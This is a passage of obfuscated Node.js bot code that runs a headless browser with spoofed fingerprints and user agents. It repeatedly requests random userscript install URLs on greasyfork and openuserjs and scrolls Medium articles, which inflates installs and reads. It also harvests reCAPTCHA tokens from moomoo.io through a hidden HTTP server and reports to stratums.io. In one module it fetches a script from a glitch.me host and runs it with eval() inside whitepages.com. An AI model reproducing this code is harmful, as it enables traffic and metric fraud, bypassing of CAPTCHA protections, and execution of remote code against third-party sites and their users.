      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x23, 'I(**') + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + Y(0x18) + 'rg/en/scri' + W(0x21) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x21) + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + Y(0x22) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + X(0x0, 'B6sb') + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + Y(0x5) + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + X(0x1f, '%Z2s') + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + W(0x13) + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + W(0x10),
    Y(0x1c) + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1178 + -0x1894 + 0x71c
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require(Z(0xa) + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x29 * 0x3d + -0x46 * 0x1 + -0x97f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xc7 + -0x7 * -0x1cd + 0x2 * -0x67f), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x236 + 0x25 * 0xe4 + -0x4a * 0x69), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x213c + -0x1f17 + -0x21 * -0x1f3;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x43a * -0x3 + -0x17b + 0xe29; w < getRandomInt(-0x203b + -0x9 * -0x229 + 0x5 * 0x28f, -0x1dc + -0x1b * -0x10b + -0x1a48); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1652f + -0x36ed + -0xa19f * -0x4);
        }
      }();
    }, 0x1 * -0x1b00 + 0x9e0 + 0x13 * 0xec), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x10e6 + 0x1ac8 + -0x9e2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y[a0(0xb, 'XtW%')](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xc * 0x10d + 0xf9a + -0x2fe, 0x69 + -0x6de * -0x3 + -0x14d1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x25 * 0x311 + 0x6b87 + 0x2 * 0x3d8f);
    }, -0x45d * -0x5 + -0x1e40 + 0x8d3), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x55e + 0x116 * -0x18 + 0x1f6e;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x472 * 0x1 + -0xc * 0xa4 + 0x17f * 0xa), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1 * 0x49d + -0x2ed * -0x3 + -0x42a), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1029fd + 0x64fb * 0x30 + -0xaf68d * -0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x576 + -0x3a1 * -0x3 + -0xff5);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * -0xe9 + 0x308 + -0x329);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process[W(0x1d)]['PORT'] || 0x108c + -0x3c8d * -0x1 + -0x1 * 0x2d89);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = c;
  async function f() {
    const a2 = b,
      a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1932 + 0x3b * 0x3c + 0x7 * -0x593) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x332 + 0xfa + 0x239));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x3 * -0xc83 + -0x4b3 + -0x11 * -0x27c, D['indexOf']('\x20'));
        return B ? E['slice'](0x2f * -0xa0 + 0x12f6 + 0x2 * 0x535, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x9b * -0x7d + -0x3635 + 0x1196),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + a1(0x1),
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers'][a2(0xd, 'Rwsm')]('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x3838 + -0x2987 * 0x1 + -0x185f * -0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + a3(0x6) + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
